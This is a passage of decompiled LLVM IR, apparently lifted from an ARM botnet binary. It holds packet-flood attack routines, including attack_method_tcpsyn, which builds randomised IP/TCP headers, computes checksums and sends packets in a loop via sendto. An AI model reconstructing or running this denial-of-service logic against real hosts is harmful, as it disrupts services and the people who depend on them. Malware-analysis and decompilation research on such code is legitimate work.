  %v7_bfb8 = icmp eq i8 %v3_bfb0, 31
  store i1 %v7_bfb8, i1* %cpsr_z.global-to-local, align 1
  %v1_bfbc = add i32 %v7_bfb4, 20
  store i32 %v1_bfbc, i32* @r6, align 4
  %tmp77 = icmp ult i8 %v3_bfb0, 32
  br i1 %tmp77, label %dec_label_pc_c0b8, label %dec_label_pc_bfc4

dec_label_pc_bfc4:                                ; preds = %dec_label_pc_bfa0
  store i32 %v6_bcd0, i32* %r0.global-to-local, align 4
  store i1 %v7_bfc8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_bfc8, label %dec_label_pc_c118, label %dec_label_pc_bfd0

dec_label_pc_bfd0:                                ; preds = %dec_label_pc_c0b8, %dec_label_pc_bfc4
  store i32 %v3_bd2c, i32* %r1.global-to-local, align 4
  store i32 65535, i32* @r4, align 4
  store i1 %v3_c128, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_c128, label %dec_label_pc_c134, label %dec_label_pc_bfe4

dec_label_pc_bfe4:                                ; preds = %dec_label_pc_c118.dec_label_pc_bfe4_crit_edge, %dec_label_pc_bfd0
  %v1_bfe8 = phi i32 [ %v1_bfe8.pre, %dec_label_pc_c118.dec_label_pc_bfe4_crit_edge ], [ 65535, %dec_label_pc_bfd0 ]
  store i32 %v3_bd30, i32* %r2.global-to-local, align 4
  %v9_bfe8 = icmp eq i32 %v3_bd30, %v1_bfe8
  store i1 %v9_bfe8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_bfe8, label %dec_label_pc_c148, label %dec_label_pc_bff0

dec_label_pc_bff0:                                ; preds = %dec_label_pc_c134.dec_label_pc_bff0_crit_edge, %dec_label_pc_bfe4
  %v1_bff4 = phi i32 [ %v1_bff4.pre, %dec_label_pc_c134.dec_label_pc_bff0_crit_edge ], [ %v1_bfe8, %dec_label_pc_bfe4 ]
  store i32 %v3_bd34, i32* %r3.global-to-local, align 4
  %v9_bff4 = icmp eq i32 %v3_bd34, %v1_bff4
  store i1 %v9_bff4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_bff4, label %dec_label_pc_c15c, label %dec_label_pc_bffc

dec_label_pc_bffc:                                ; preds = %dec_label_pc_c148.dec_label_pc_bffc_crit_edge, %dec_label_pc_bff0
  %v1_c000 = phi i32 [ %v1_c000.pre, %dec_label_pc_c148.dec_label_pc_bffc_crit_edge ], [ %v1_bff4, %dec_label_pc_bff0 ]
  store i32 %v5_bbd0, i32* %ip.global-to-local, align 4
  %v9_c000 = icmp eq i32 %v5_bbd0, %v1_c000
  store i1 %v9_c000, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c000, label %dec_label_pc_c170, label %dec_label_pc_c008

dec_label_pc_c008:                                ; preds = %dec_label_pc_c15c.dec_label_pc_c008_crit_edge, %dec_label_pc_bffc
  %v1_c00c = phi i32 [ %v1_c00c.pre, %dec_label_pc_c15c.dec_label_pc_c008_crit_edge ], [ %v1_c000, %dec_label_pc_bffc ]
  store i32 %v6_bbec, i32* %r0.global-to-local, align 4
  %v9_c00c = icmp eq i32 %v6_bbec, %v1_c00c
  store i1 %v9_c00c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c00c, label %dec_label_pc_c184, label %dec_label_pc_c014

dec_label_pc_c014:                                ; preds = %dec_label_pc_c170, %dec_label_pc_c008
  store i32 %v1_bcbc, i32* %r1.global-to-local, align 4
  store i1 %v2_c18c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_c18c, label %dec_label_pc_c020, label %dec_label_pc_c198

dec_label_pc_c020:                                ; preds = %dec_label_pc_c014, %dec_label_pc_c184, %dec_label_pc_c198
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_c024 = load i32, i32* @r5, align 4
  %v3_c024 = add i32 %v2_c024, 10
  %v4_c024 = inttoptr i32 %v3_c024 to i16*
  store i16 0, i16* %v4_c024, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_c02c = load i32, i32* @r5, align 4
  store i32 %v0_c02c, i32* @r0, align 4
  %v2_c030 = call i32 @checksum_generic(i32 %v0_c02c, i32 20)
  %v3_c030 = trunc i32 %v2_c030 to i16
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_c038 = load i32, i32* @r5, align 4
  %v4_c038 = add i32 %v3_c038, 10
  %v5_c038 = inttoptr i32 %v4_c038 to i16*
  store i16 %v3_c030, i16* %v5_c038, align 2
  %v0_c03c = load i32, i32* @r6, align 4
  store i32 %v0_c03c, i32* @r1, align 4
  %v0_c040 = load i32, i32* %r3.global-to-local, align 4
  %v1_c040 = trunc i32 %v0_c040 to i16
  %v3_c040 = add i32 %v0_c03c, 16
  %v4_c040 = inttoptr i32 %v3_c040 to i16*
  store i16 %v1_c040, i16* %v4_c040, align 2
  %v0_c044 = load i32, i32* @sl, align 4
  store i32 %v0_c044, i32* %r2.global-to-local, align 4
  %v0_c048 = load i32, i32* @sb, align 4
  store i32 %v0_c048, i32* %r3.global-to-local, align 4
  %v0_c04c = load i32, i32* @r5, align 4
  store i32 %v0_c04c, i32* %r0.global-to-local, align 4
  %v4_c050 = call i32 @checksum_tcpudp(i32 %v0_c04c, i32 %v0_c03c, i32 %v0_c044, i32 %v0_c048)
  %v5_c050 = trunc i32 %v4_c050 to i16
  store i32 %v4_c050, i32* %r0.global-to-local, align 4
  %v3_c054 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_c054, i32* %r3.global-to-local, align 4
  %v3_c058 = mul i32 %v3_c054, 32
  store i32 %v3_c058, i32* %lr.global-to-local, align 4
  %v3_c05c = load i32, i32* @r6, align 4
  %v4_c05c = add i32 %v3_c05c, 16
  %v5_c05c = inttoptr i32 %v4_c05c to i16*
  store i16 %v5_c050, i16* %v5_c05c, align 2
  %v0_c060 = load i32, i32* %lr.global-to-local, align 4
  %v1_c060 = load i32, i32* %r3.global-to-local, align 4
  %tmp78 = mul i32 %v1_c060, -8
  %v5_c060 = add i32 %v0_c060, %tmp78
  store i32 %v5_c060, i32* %lr.global-to-local, align 4
  %v0_c064 = load i32, i32* @r6, align 4
  %v1_c064 = add i32 %v0_c064, 2
  %v2_c064 = inttoptr i32 %v1_c064 to i16*
  %v3_c064 = load i16, i16* %v2_c064, align 2
  %v4_c064 = zext i16 %v3_c064 to i32
  store i32 %v4_c064, i32* @r6, align 4
  %v1_c068 = load i32, i32* @r8, align 4
  %v2_c068 = add i32 %v1_c068, %v5_c060
  store i32 %v2_c068, i32* @lr, align 4
  %v3_c06c = add i32 %v2_c068, 2
  %v4_c06c = inttoptr i32 %v3_c06c to i16*
  store i16 %v3_c064, i16* %v4_c06c, align 2
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_c078 = load i32, i32* @r5, align 4
  store i32 %v0_c078, i32* %r1.global-to-local, align 4
  store i32 %v3_bce4, i32* %r0.global-to-local, align 4
  %v0_c080 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_c080, i32* %r2.global-to-local, align 4
  %v0_c084 = load i32, i32* @lr, align 4
  %v6_c08c = call i32 @__libc_sendto(i32 %v3_bce4, i32 %v0_c078, i32 %v0_c080, i32 16384, i32 %v0_c084, i32 16)
  %v3_c090 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_c090, i32* %r3.global-to-local, align 4
  %v1_c094 = add i32 %v3_c090, 1
  store i32 %v1_c094, i32* %r0.global-to-local, align 4
  %v1_c098 = load i32, i32* @r7, align 4
  %v9_c098 = icmp eq i32 %v1_c094, %v1_c098
  store i1 %v9_c098, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_c094, i32* %stack_var_-44, align 4
  %v5_c0a0 = icmp slt i32 %v1_c094, %v1_c098
  br i1 %v5_c0a0, label %dec_label_pc_bfa0, label %dec_label_pc_c0a4

dec_label_pc_c0a4:                                ; preds = %dec_label_pc_c020
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_c0a8 = icmp eq i32 %v1_c098, 0
  store i1 %v2_c0a8, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_c0a8, label %dec_label_pc_bf8c, label %dec_label_pc_bf9c

dec_label_pc_c0b8:                                ; preds = %dec_label_pc_bfa0
  %v1_c0b8 = add i32 %v2_bfa8, 16
  %v2_c0b8 = inttoptr i32 %v1_c0b8 to i32*
  %v3_c0b8 = load i32, i32* %v2_c0b8, align 4
  %v0_c0bc = call i32 @rand_next()
  store i32 %v0_c0bc, i32* %r0.global-to-local, align 4
  %v3_c0c0 = load i32, i32* %stack_var_-44, align 4
  %v5_c0c8 = mul i32 %v3_c0c0, 24
  %v1_c0cc = and i32 %v3_c0b8, 16711680
  store i32 %v1_c0cc, i32* %ip.global-to-local, align 4
  %v3_c0d0 = udiv i32 %v3_c0b8, 16777216
  %v4_c0d4 = udiv i32 %v1_c0cc, 256
  %v5_c0d4 = or i32 %v4_c0d4, %v3_c0d0
  store i32 %v5_c0d4, i32* %r2.global-to-local, align 4
  %v1_c0d8 = load i32, i32* @r8, align 4
  %v2_c0d8 = add i32 %v1_c0d8, %v5_c0c8
  store i32 %v2_c0d8, i32* %r1.global-to-local, align 4
  %v1_c0dc = and i32 %v3_c0b8, 65280
  store i32 %v1_c0dc, i32* %r3.global-to-local, align 4
  %v1_c0e0 = add i32 %v2_c0d8, 20
  %v2_c0e0 = inttoptr i32 %v1_c0e0 to i8*
  %v3_c0e0 = load i8, i8* %v2_c0e0, align 1
  %v4_c0e0 = zext i8 %v3_c0e0 to i32
  store i32 %v4_c0e0, i32* %ip.global-to-local, align 4
  %v5_c0e8 = call i32 @llvm.bswap.i32(i32 %v3_c0b8)
  %v7_c0ec = lshr i32 %v0_c0bc, %v4_c0e0
  %v8_c0ec = add i32 %v7_c0ec, %v5_c0e8
  store i32 %v8_c0ec, i32* %r2.global-to-local, align 4
  %v1_c0fc = and i32 %v8_c0ec, 65280
  store i32 %v1_c0fc, i32* %r1.global-to-local, align 4
  store i32 %v6_bcd0, i32* %r0.global-to-local, align 4
  %v5_c108 = call i32 @llvm.bswap.i32(i32 %v8_c0ec)
  store i32 %v5_c108, i32* %r3.global-to-local, align 4
  store i1 %v7_bfc8, i1* %cpsr_z.global-to-local, align 1
  %v1_c110 = load i32, i32* @r5, align 4
  %v2_c110 = add i32 %v1_c110, 16
  %v3_c110 = inttoptr i32 %v2_c110 to i32*
  store i32 %v5_c108, i32* %v3_c110, align 4
  br i1 %v2_bfc8, label %dec_label_pc_c118, label %dec_label_pc_bfd0

dec_label_pc_c118:                                ; preds = %dec_label_pc_c0b8, %dec_label_pc_bfc4
  %v0_c118 = call i32 @rand_next()
  store i32 %v0_c118, i32* %r0.global-to-local, align 4
  store i32 %v3_bd2c, i32* %r1.global-to-local, align 4
  store i32 65535, i32* @r4, align 4
  store i1 %v3_c128, i1* %cpsr_z.global-to-local, align 1
  %v1_c12c = load i32, i32* @r5, align 4
  %v2_c12c = add i32 %v1_c12c, 12
  %v3_c12c = inttoptr i32 %v2_c12c to i32*
  store i32 %v0_c118, i32* %v3_c12c, align 4
  br i1 %v3_c128, label %dec_label_pc_c134, label %dec_label_pc_c118.dec_label_pc_bfe4_crit_edge

dec_label_pc_c118.dec_label_pc_bfe4_crit_edge:    ; preds = %dec_label_pc_c118
  %v1_bfe8.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_bfe4

dec_label_pc_c134:                                ; preds = %dec_label_pc_c118, %dec_label_pc_bfd0
  %v0_c134 = call i32 @rand_next()
  %v1_c134 = trunc i32 %v0_c134 to i16
  store i32 %v0_c134, i32* %r0.global-to-local, align 4
  store i32 %v3_bd30, i32* %r2.global-to-local, align 4
  %v1_c13c = load i32, i32* @r4, align 4
  %v9_c13c = icmp eq i32 %v3_bd30, %v1_c13c
  store i1 %v9_c13c, i1* %cpsr_z.global-to-local, align 1
  %v3_c140 = load i32, i32* @r5, align 4
  %v4_c140 = add i32 %v3_c140, 4
  %v5_c140 = inttoptr i32 %v4_c140 to i16*
  store i16 %v1_c134, i16* %v5_c140, align 2
  br i1 %v9_c13c, label %dec_label_pc_c148, label %dec_label_pc_c134.dec_label_pc_bff0_crit_edge

dec_label_pc_c134.dec_label_pc_bff0_crit_edge:    ; preds = %dec_label_pc_c134
  %v1_bff4.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_bff0

dec_label_pc_c148:                                ; preds = %dec_label_pc_c134, %dec_label_pc_bfe4
  %v0_c148 = call i32 @rand_next()
  %v1_c148 = trunc i32 %v0_c148 to i16
  store i32 %v0_c148, i32* %r0.global-to-local, align 4
  store i32 %v3_bd34, i32* %r3.global-to-local, align 4
  %v1_c150 = load i32, i32* @r4, align 4
  %v9_c150 = icmp eq i32 %v3_bd34, %v1_c150
  store i1 %v9_c150, i1* %cpsr_z.global-to-local, align 1
  %v3_c154 = load i32, i32* @r5, align 4
  %v4_c154 = add i32 %v3_c154, 20
  %v5_c154 = inttoptr i32 %v4_c154 to i16*
  store i16 %v1_c148, i16* %v5_c154, align 2
  br i1 %v9_c150, label %dec_label_pc_c15c, label %dec_label_pc_c148.dec_label_pc_bffc_crit_edge

dec_label_pc_c148.dec_label_pc_bffc_crit_edge:    ; preds = %dec_label_pc_c148
  %v1_c000.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_bffc

dec_label_pc_c15c:                                ; preds = %dec_label_pc_c148, %dec_label_pc_bff0
  %v0_c15c = call i32 @rand_next()
  %v1_c15c = trunc i32 %v0_c15c to i16
  store i32 %v0_c15c, i32* %r0.global-to-local, align 4
  store i32 %v5_bbd0, i32* %ip.global-to-local, align 4
  %v1_c164 = load i32, i32* @r4, align 4
  %v9_c164 = icmp eq i32 %v5_bbd0, %v1_c164
  store i1 %v9_c164, i1* %cpsr_z.global-to-local, align 1
  %v3_c168 = load i32, i32* @r6, align 4
  %v4_c168 = add i32 %v3_c168, 2
  %v5_c168 = inttoptr i32 %v4_c168 to i16*
  store i16 %v1_c15c, i16* %v5_c168, align 2
  br i1 %v9_c164, label %dec_label_pc_c170, label %dec_label_pc_c15c.dec_label_pc_c008_crit_edge

dec_label_pc_c15c.dec_label_pc_c008_crit_edge:    ; preds = %dec_label_pc_c15c
  %v1_c00c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_c008

dec_label_pc_c170:                                ; preds = %dec_label_pc_c15c, %dec_label_pc_bffc
  %v0_c170 = call i32 @rand_next()
  %v1_c174 = load i32, i32* @r6, align 4
  %v2_c174 = add i32 %v1_c174, 4
  %v3_c174 = inttoptr i32 %v2_c174 to i32*
  store i32 %v0_c170, i32* %v3_c174, align 4
  store i32 %v6_bbec, i32* %r0.global-to-local, align 4
  %v1_c17c = load i32, i32* @r4, align 4
  %v9_c17c = icmp eq i32 %v6_bbec, %v1_c17c
  store i1 %v9_c17c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c17c, label %dec_label_pc_c184, label %dec_label_pc_c014

dec_label_pc_c184:                                ; preds = %dec_label_pc_c170, %dec_label_pc_c008
  %v0_c184 = call i32 @rand_next()
  store i32 %v0_c184, i32* %r0.global-to-local, align 4
  store i32 %v1_bcbc, i32* %r1.global-to-local, align 4
  store i1 %v2_c18c, i1* %cpsr_z.global-to-local, align 1
  %v1_c190 = load i32, i32* @r6, align 4
  %v2_c190 = add i32 %v1_c190, 8
  %v3_c190 = inttoptr i32 %v2_c190 to i32*
  store i32 %v0_c184, i32* %v3_c190, align 4
  br i1 %v2_c18c, label %dec_label_pc_c020, label %dec_label_pc_c198

dec_label_pc_c198:                                ; preds = %dec_label_pc_c014, %dec_label_pc_c184
  %v0_c198 = load i32, i32* @r5, align 4
  %v1_c198 = add i32 %v0_c198, 40
  store i32 %v1_c198, i32* %r0.global-to-local, align 4
  store i32 %v6_bc94, i32* %r1.global-to-local, align 4
  %v2_c1a0 = inttoptr i32 %v1_c198 to i16*
  %v3_c1a0 = call i32 @rand_str(i16* %v2_c1a0, i32 %v6_bc94)
  store i32 %v3_c1a0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_c020

dec_label_pc_c1a8:                                ; preds = %dec_label_pc_bcf4
  store i32 %v3_bce4, i32* %r0.global-to-local, align 4
  %v1_c1ac = call i32 @__GI___libc_close(i32 %v3_bce4)
  store i32 %v1_c1ac, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_c1b0

dec_label_pc_c1b0:                                ; preds = %entry, %dec_label_pc_c1a8
  %v1_c1b8 = phi i32 [ %v3_bce4, %entry ], [ %v1_c1ac, %dec_label_pc_c1a8 ]
  store i32 %v18_bae4, i32* %sb.global-to-local, align 4
  store i32 %v24_bae4, i32* %fp.global-to-local, align 4
  store i32 %v27_bae4, i32* %lr.global-to-local, align 4
  ret i32 %v1_c1b8

dec_label_pc_c1bc:                                ; preds = %dec_label_pc_bd1c
  store i32 %v6_bc94, i32* %r0.global-to-local, align 4
  %v1_c1c4 = add i32 %v6_bc94, 20
  store i32 %v1_c1c4, i32* @sb, align 4
  %v3_c1c8 = mul i32 %v6_bc94, 65536
  store i32 %v3_c1c8, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_bf78

; uselistorder directives
  uselistorder i32 %v0_c15c, { 1, 0 }
  uselistorder i32 %v0_c148, { 1, 0 }
  uselistorder i32 %v0_c134, { 1, 0 }
  uselistorder i32 %v5_c108, { 1, 0 }
  uselistorder i32 %v3_c0b8, { 2, 1, 3, 0 }
  uselistorder i32 %v1_c094, { 2, 0, 3, 4, 1 }
  uselistorder i32 %v5_c060, { 1, 0 }
  uselistorder i32 %v4_c050, { 1, 0 }
  uselistorder i1 %v7_bfc8, { 2, 1, 0 }
  uselistorder i1 %v2_c18c, { 2, 3, 1, 0 }
  uselistorder i1 %v3_c128, { 1, 0, 2, 3 }
  uselistorder i32 %stack_var_-140.0, { 1, 0 }
  uselistorder i32 %v1_bf5c, { 1, 0, 2, 3 }
  uselistorder i32 %v0_bf30, { 1, 0 }
  uselistorder i32 %v1_bde4, { 1, 2, 0 }
  uselistorder i32 %v1_bde0, { 2, 1, 0 }
  uselistorder i32 %v1_bddc, { 2, 0, 1 }
  uselistorder i32 %v1_bdd8, { 2, 0, 1 }
  uselistorder i32 %v1_bdd4, { 2, 0, 1 }
  uselistorder i32 %v1_bdac, { 1, 0 }
  uselistorder i32 %v3_bd54, { 1, 0 }
  uselistorder i32 %v3_bd2c, { 0, 1, 3, 2 }
  uselistorder i32 %v0_bd24, { 1, 0, 2 }
  uselistorder i32 %v0_bd20, { 1, 0, 2 }
  uselistorder i32 %v0_bd1c, { 1, 0, 3, 2 }
  uselistorder i1 %v7_bd14, { 1, 0 }
  uselistorder i1 %v7_bce8, { 1, 0 }
  uselistorder i32 %v3_bce4, { 1, 3, 4, 5, 6, 2, 0, 7 }
  uselistorder i32 %v6_bcd0, { 5, 3, 0, 4, 2, 1 }
  uselistorder i32 %v1_bcbc, { 2, 1, 3, 4, 0 }
  uselistorder i32 %v6_bc94, { 0, 10, 9, 8, 7, 2, 4, 3, 6, 5, 1 }
  uselistorder i32 %v6_bbec, { 3, 2, 1, 0 }
  uselistorder i32 %v5_bbd0, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_bb80, { 1, 0 }
  uselistorder i32 %v2_bb00, { 0, 4, 1, 3, 2 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 11, 10 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 5, 4, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 26, 25, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 21, 20, 22, 23, 24, 25, 26, 27, 28, 30, 29, 31, 32, 33, 34, 36, 35, 38, 37, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 3, 2, 6, 4, 7, 5, 8, 9, 10, 12, 11, 14, 13, 15, 17, 16, 18, 19, 20, 22, 21, 27, 23, 24, 25, 26, 31, 28, 29, 30, 32, 34, 33, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 0 }
  uselistorder i16 64, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_c1b0, { 1, 0 }
  uselistorder label %dec_label_pc_c198, { 1, 0 }
  uselistorder label %dec_label_pc_c020, { 2, 1, 0 }
  uselistorder label %dec_label_pc_bf9c, { 1, 0 }
  uselistorder label %dec_label_pc_bf8c, { 1, 0, 2 }
  uselistorder label %bb70, { 1, 0 }
  uselistorder label %.thread4, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @attack_method_tcpsyn(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-44 = alloca i32, align 4
  %v3_c1dc = load i32, i32* @r4, align 4
  %v24_c1dc = load i32, i32* @fp, align 4
  %v27_c1dc = load i32, i32* @lr, align 4
  store i32 %arg2, i32* @r8, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg1, i32* @r7, align 4
  %v2_c1f8 = call i32 @calloc(i32 %arg1, i32 4)
  %v0_c1fc = load i32, i32* @r5, align 4
  store i32 %v0_c1fc, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v2_c1f8, i32* @sb, align 4
  %v0_c20c = load i32, i32* @r4, align 4
  store i32 %v0_c20c, i32* %r0.global-to-local, align 4
  %v4_c210 = inttoptr i32 %v0_c1fc to i32*
  %v5_c210 = call i32 @attack_get_opt_int(i32 %v0_c20c, i32* %v4_c210, i32 2, i32 0)
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_c228 = load i32, i32* @r5, align 4
  store i32 %v0_c228, i32* %r1.global-to-local, align 4
  %v0_c22c = load i32, i32* @r4, align 4
  store i32 %v0_c22c, i32* %r0.global-to-local, align 4
  %v5_c230 = trunc i32 %v5_c210 to i8
  %v6_c234 = inttoptr i32 %v0_c228 to i32*
  %v7_c234 = call i32 @attack_get_opt_int(i32 %v0_c22c, i32* %v6_c234, i32 3, i32 65535)
  %v0_c238 = load i32, i32* @r5, align 4
  store i32 %v0_c238, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v0_c248 = load i32, i32* @r4, align 4
  store i32 %v0_c248, i32* %r0.global-to-local, align 4
  %v5_c24c = inttoptr i32 %v0_c238 to i32*
  %v6_c24c = call i32 @attack_get_opt_int(i32 %v0_c248, i32* %v5_c24c, i32 4, i32 64)
  %v1_c254 = urem i32 %v6_c24c, 256
  %v0_c258 = load i32, i32* @r5, align 4
  store i32 %v0_c258, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_c264 = load i32, i32* @r4, align 4
  store i32 %v0_c264, i32* %r0.global-to-local, align 4
  %v6_c26c = inttoptr i32 %v0_c258 to i32*
  %v7_c26c = call i32 @attack_get_opt_int(i32 %v0_c264, i32* %v6_c26c, i32 5, i32 1)
  %v1_c278 = urem i32 %v7_c26c, 256
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_c284 = load i32, i32* @r5, align 4
  store i32 %v0_c284, i32* %r1.global-to-local, align 4
  %v0_c288 = load i32, i32* @r4, align 4
  store i32 %v0_c288, i32* %r0.global-to-local, align 4
  %v5_c290 = inttoptr i32 %v0_c284 to i32*
  %v6_c290 = call i32 @attack_get_opt_int(i32 %v0_c288, i32* %v5_c290, i32 6, i32 65535)
  %v0_c298 = load i32, i32* @r5, align 4
  store i32 %v0_c298, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 %v6_c290, i32* %fp.global-to-local, align 4
  %v0_c2a8 = load i32, i32* @r4, align 4
  store i32 %v0_c2a8, i32* %r0.global-to-local, align 4
  %v4_c2ac = inttoptr i32 %v0_c298 to i32*
  %v5_c2ac = call i32 @attack_get_opt_int(i32 %v0_c2a8, i32* %v4_c2ac, i32 7, i32 65535)
  %v0_c2b4 = load i32, i32* @r5, align 4
  store i32 %v0_c2b4, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 17, i32* %r2.global-to-local, align 4
  store i32 %v5_c2ac, i32* @r6, align 4
  %v0_c2c4 = load i32, i32* @r4, align 4
  store i32 %v0_c2c4, i32* %r0.global-to-local, align 4
  %v4_c2c8 = inttoptr i32 %v0_c2b4 to i32*
  %v5_c2c8 = call i32 @attack_get_opt_int(i32 %v0_c2c4, i32* %v4_c2c8, i32 17, i32 65535)
  %v0_c2cc = load i32, i32* @r5, align 4
  store i32 %v0_c2cc, i32* %r1.global-to-local, align 4
  store i32 18, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_c2dc = load i32, i32* @r4, align 4
  store i32 %v0_c2dc, i32* %r0.global-to-local, align 4
  %v5_c2e0 = inttoptr i32 %v0_c2cc to i32*
  %v6_c2e0 = call i32 @attack_get_opt_int(i32 %v0_c2dc, i32* %v5_c2e0, i32 18, i32 0)
  %v0_c2e4 = load i32, i32* @r5, align 4
  store i32 %v0_c2e4, i32* %r1.global-to-local, align 4
  store i32 11, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_c2f4 = load i32, i32* @r4, align 4
  store i32 %v0_c2f4, i32* %r0.global-to-local, align 4
  %v5_c2f8 = inttoptr i32 %v0_c2e4 to i32*
  %v6_c2f8 = call i32 @attack_get_opt_int(i32 %v0_c2f4, i32* %v5_c2f8, i32 11, i32 0)
  %v0_c2fc = load i32, i32* @r5, align 4
  store i32 %v0_c2fc, i32* %r1.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_c30c = load i32, i32* @r4, align 4
  store i32 %v0_c30c, i32* %r0.global-to-local, align 4
  %v5_c310 = inttoptr i32 %v0_c2fc to i32*
  %v6_c310 = call i32 @attack_get_opt_int(i32 %v0_c30c, i32* %v5_c310, i32 12, i32 0)
  %v0_c314 = load i32, i32* @r5, align 4
  store i32 %v0_c314, i32* %r1.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_c324 = load i32, i32* @r4, align 4
  store i32 %v0_c324, i32* %r0.global-to-local, align 4
  %v5_c328 = inttoptr i32 %v0_c314 to i32*
  %v6_c328 = call i32 @attack_get_opt_int(i32 %v0_c324, i32* %v5_c328, i32 13, i32 0)
  %v0_c32c = load i32, i32* @r5, align 4
  store i32 %v0_c32c, i32* %r1.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_c33c = load i32, i32* @r4, align 4
  store i32 %v0_c33c, i32* %r0.global-to-local, align 4
  %v5_c340 = inttoptr i32 %v0_c32c to i32*
  %v6_c340 = call i32 @attack_get_opt_int(i32 %v0_c33c, i32* %v5_c340, i32 14, i32 0)
  %v0_c344 = load i32, i32* @r5, align 4
  store i32 %v0_c344, i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_c354 = load i32, i32* @r4, align 4
  store i32 %v0_c354, i32* %r0.global-to-local, align 4
  %v5_c358 = inttoptr i32 %v0_c344 to i32*
  %v6_c358 = call i32 @attack_get_opt_int(i32 %v0_c354, i32* %v5_c358, i32 15, i32 1)
  %v0_c35c = load i32, i32* @r5, align 4
  store i32 %v0_c35c, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_c36c = load i32, i32* @r4, align 4
  store i32 %v0_c36c, i32* %r0.global-to-local, align 4
  %v5_c370 = inttoptr i32 %v0_c35c to i32*
  %v6_c370 = call i32 @attack_get_opt_int(i32 %v0_c36c, i32* %v5_c370, i32 16, i32 0)
  %v2_c37c = load i32, i32* @global_var_24d4c.56, align 4
  store i32 %v2_c37c, i32* %r3.global-to-local, align 4
  %v0_c380 = load i32, i32* @r5, align 4
  store i32 %v0_c380, i32* %r1.global-to-local, align 4
